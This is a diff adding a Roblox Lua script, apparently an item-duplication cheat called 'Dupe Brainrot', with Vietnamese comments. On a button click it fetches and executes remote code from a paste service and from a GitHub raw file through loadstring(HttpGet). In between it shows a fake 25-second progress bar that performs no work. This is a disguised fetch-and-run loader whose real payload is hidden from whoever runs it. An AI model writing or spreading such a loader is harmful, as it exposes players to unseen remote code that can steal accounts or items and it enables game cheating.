@@ -1,0 +1,71 @@
+-- Services
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local GuiService = Player:WaitForChild("PlayerGui")
+
+-- Xoá GUI cũ nếu có
+if GuiService:FindFirstChild("DupeBrainrotGUI") then
+    GuiService.DupeBrainrotGUI:Destroy()
+end
+
+-- GUI mới
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DupeBrainrotGUI"
+screenGui.Parent = GuiService
+
+-- Button mở menu
+local openButton = Instance.new("TextButton")
+openButton.Size = UDim2.new(0,220,0,40)
+openButton.Position = UDim2.new(0,10,0,10)
+openButton.Text = "Open Menu Dupe Brainrot"
+openButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
+openButton.TextColor3 = Color3.fromRGB(255,255,255)
+openButton.Font = Enum.Font.GothamBold
+openButton.TextSize = 18
+openButton.Parent = screenGui
+
+-- Progress Bar
+local progressFrame = Instance.new("Frame")
+progressFrame.Size = UDim2.new(0,300,0,20)
+progressFrame.Position = UDim2.new(0.5,-150,0.5,0)
+progressFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
+progressFrame.Visible = false
+progressFrame.Parent = screenGui
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0,0,1,0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0,255,0)
+progressBar.Parent = progressFrame
+
+local progressLabel = Instance.new("TextLabel")
+progressLabel.Size = UDim2.new(1,0,1,0)
+progressLabel.BackgroundTransparency = 1
+progressLabel.TextColor3 = Color3.fromRGB(255,255,255)
+progressLabel.Text = "0%"
+progressLabel.Font = Enum.Font.GothamBold
+progressLabel.TextSize = 14
+progressLabel.Parent = progressFrame
+
+-- Script logic
+openButton.MouseButton1Click:Connect(function()
+    openButton.Visible = false
+
+    -- Load script loader (Script 1)
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/zjqq3oCSWSmgU0Ym/raw"))()
+
+    wait(5)
+
+    -- Hiển thị progress bar 25s
+    progressFrame.Visible = true
+    local duration = 25
+    local steps = 100
+    for i = 1, steps do
+        progressBar.Size = UDim2.new(i/steps,0,1,0)
+        progressLabel.Text = i.."%"
+        wait(duration/steps)
+    end
+    progressFrame.Visible = false
+
+    -- Load script Skbidi (Script 2)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PhongYTB/Lavaca/refs/heads/main/Skbidi.lua"))()
+end)
